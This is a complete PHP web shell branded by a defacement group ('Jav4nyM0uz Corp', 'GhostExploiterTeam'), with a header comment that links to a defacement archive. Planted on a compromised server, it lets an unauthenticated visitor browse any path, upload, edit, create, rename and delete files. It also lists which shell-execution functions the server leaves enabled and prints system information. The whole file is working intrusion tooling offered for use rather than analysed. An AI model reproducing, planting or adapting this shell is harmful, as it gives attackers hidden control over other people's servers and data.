<script>
// ==== Jangan Di Recode Anak Kontol ====
// ==== Made By Renzaskyi A.k.a Boss Ranzen ====
// ==== Regards: Jav4nyM0uz Corporation - D704T - GhostExploiterTeam ====
// ==== Contact: https://www.facebook.com/share/1B9sR2s6mD/ ====
// ==== Archiver: https://zone-xsec.com/archive/attacker/boss+ranzen                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
</script>

<?php

ini_set('upload_max_filesize', '30M');
ini_set('post_max_size', '30M');
ini_set('max_execution_time', 300);
ini_set('max_input_time', 300);

// Path sekarang
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
chdir($path);

// === DELETE FILE/FOLDER ===
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

// === RENAME ===
if ($_POST['rename_old'] ?? false && $_POST['rename_new'] ?? false) {
    rename($_POST['rename_old'], $_POST['rename_new']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === EDIT FILE ===
if (isset($_GET['edit'])) {
    $editFile = $_GET['edit'];

    if (isset($_POST['new_content'])) {
        file_put_contents($editFile, $_POST['new_content']);
        header("Location: ?path=" . urlencode($path));
        exit;
    }

    $content = htmlspecialchars(file_get_contents($editFile));
    ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Orbitron:wght@400;600&family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
    body{
        font-family:'Poppins',sans-serif;
        background:url('https://b.top4top.io/p_36289rhe30.jpg') center/cover no-repeat fixed;
        color:#e3e8f0;margin:0;padding:20px;
        backdrop-filter: blur(4px);
    }
    .glass{
        background:rgba(8,14,30,0.72);
        border:1px solid rgba(0,80,255,0.3);
        box-shadow:0 0 10px rgba(0,80,255,0.4);
        padding:15px;border-radius:10px;
    }
    textarea{
        width:100%;height:70vh;background:#050914;
        border:1px solid #0052a5;color:#9ec6ff;
        padding:10px;border-radius:8px;
        font-family:monospace;
    }
    input[type=submit]{
        margin-top:10px;padding:10px 20px;
        background:#003374;border:none;color:#fff;
        border-radius:6px;cursor:pointer;
        font-weight:bold;
    }
    input[type=submit]:hover{background:#004aa8}
    h1.jx-title{
        font-family:'Press Start 2P','Orbitron',sans-serif;
        text-align:center;
        letter-spacing:2px;
        margin:15px;
        font-size:28px;
        color:#00eaff;
        text-shadow:
            3px 3px 0 #000,
            5px 5px 12px #000,
            0 0 12px #00ffff,
            0 0 20px #0099ff;
    }
</style>
</head>
<body>
<div class="glass">
<h1 class="jx-title"><\> Jav4nyM0uz Corp <\></h1>
<h2 style="font-family:Orbitron;color:#0095ff;text-shadow:0 0 6px #0077ff">Edit File: <?= htmlspecialchars($editFile) ?></h2>
<form method="post">
<textarea name="new_content"><?= $content ?></textarea><br>
<input type="submit" value="Save">
</form>
</div>
</body>
</html>
<?php
exit;
}

// === UPLOAD FILE FIX LITESPEED ===
if (isset($_FILES['file_upload'])) {
    $tmp = $_FILES['file_upload']['tmp_name'];
    $name = $_FILES['file_upload']['name'];
    $target = $path . "/" . $name;
    if (is_uploaded_file($tmp) && filesize($tmp) > 0) move_uploaded_file($tmp, $target);
    else file_put_contents($target . ".failed", "UPLOAD FAILED / 0KB (LITESPEED PROTECTION)");
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === CREATE FILE ===
if ($_POST['new_file'] ?? false) {
    $newFile = $path . "/" . $_POST['new_file'];
    if (!file_exists($newFile)) file_put_contents($newFile, "");
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === CREATE FOLDER ===
if ($_POST['new_folder'] ?? false) {
    $newFolder = $path . "/" . $_POST['new_folder'];
    if (!file_exists($newFolder)) mkdir($newFolder);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ===== CEK TERMINAL SERVER =====
function fungsi_tersedia($func) {
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array($func, $disabled);
}
$functions = ['exec','shell_exec','passthru','system','popen','proc_open'];
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Orbitron:wght@400;600&family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
    body{
        font-family:'Poppins',sans-serif;
        background:url('https://b.top4top.io/p_36289rhe30.jpg') center/cover no-repeat fixed;
        color:#e3e8f0;margin:0;padding:20px;
        backdrop-filter: blur(3px);
    }
    h1.jx-title{
        font-family:'Press Start 2P','Orbitron',sans-serif;
        text-align:center;
        letter-spacing:2px;
        margin:15px;
        font-size:32px;
        color:#00eaff;
        text-shadow:
            3px 3px 0 #000,
            5px 5px 12px #000,
            0 0 12px #00ffff,
            0 0 20px #0099ff;
    }
    .glass{
        background:rgba(8,14,30,0.72);
        border:1px solid rgba(0,80,255,0.3);
        box-shadow:0 0 10px rgba(0,80,255,0.35);
        padding:15px;margin-bottom:20px;
        border-radius:10px;
    }
    input[type=text],input[type=file]{
        padding:8px;background:rgba(0,11,30,0.8);
        border:1px solid #004d99;border-radius:6px;
        color:#9ec6ff;width:260px;
    }
    input[type=submit]{
        padding:8px 18px;background:#003374;border:none;
        border-radius:6px;cursor:pointer;color:#fff;font-weight:bold;
    }
    input[type=submit]:hover{background:#004aa8}
    table{
        width:100%;border-collapse:collapse;
        background:rgba(8,14,30,0.70);
        border:1px solid rgba(0,80,255,0.3);
    }
    th,td{padding:10px;border-bottom:1px solid rgba(0,80,255,0.25);color:#d7e1f3}
    a{color:#0095ff;text-decoration:none}
    a:hover{text-shadow:0 0 6px #007eff}
    .status-on{color:#4dff88;font-weight:bold}
    .status-off{color:#ff4a4a;font-weight:bold}
</style>
</head>
<body>

<h1 class="jx-title"><\> Jav4nyM0uz Corp <\></h1>

<div class="glass">
<h3>Path: <?= htmlspecialchars($path) ?></h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file_upload" required>
    <input type="submit" value="Upload">
</form><br>
<form method="post">
    <input type="text" name="new_file" placeholder="New file" required>
    <input type="submit" value="Create File">
</form><br>
<form method="post">
    <input type="text" name="new_folder" placeholder="New folder" required>
    <input type="submit" value="Create Folder">
</form>
</div>

<div class="glass">
<h3>Terminal Status</h3>
<table>
<tr><th>Function</th><th>Status</th></tr>
<?php foreach ($functions as $f){
    $st = fungsi_tersedia($f) ? "<span class='status-on'>ON</span>" : "<span class='status-off'>OFF</span>";
    echo "<tr><td>$f</td><td>$st</td></tr>";
}?>
</table><br>
<b>Server Info:</b><br><?= php_uname(); ?>
</div>

<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>

<?php
$files = scandir($path);
if ($path != "/") echo "<tr><td colspan=3><a href='?path=" . urlencode(dirname($path)) . "'>Back</a></td></tr>";
foreach ($files as $file){
    if ($file=="."||$file=="..") continue;
    $full = $path."/".$file;
    echo "<tr>";
    echo "<td>".(is_dir($full)?"<a href='?path=" . urlencode($full) . "'><b>[DIR]</b> $file</a>":$file)."</td>";
    echo "<td>".(is_file($full)?filesize($full)." bytes":"-")."</td>";
    echo "<td>";
    if (is_file($full)) echo "<a href='?edit=" . urlencode($full) . "'>Edit</a> | ";
    echo "<a href='?delete=" . urlencode($full) . "' onclick='return confirm(\"Delete $file?\")'>Delete</a> | ";
    echo "<form method='post' style='display:inline'>
            <input type='hidden' name='rename_old' value='$full'>
            <input type='text' name='rename_new' placeholder='Rename'>
            <input type='submit' value='OK'>
          </form>";
    echo "</td></tr>";
}
?>
</table>

</body>
</html>
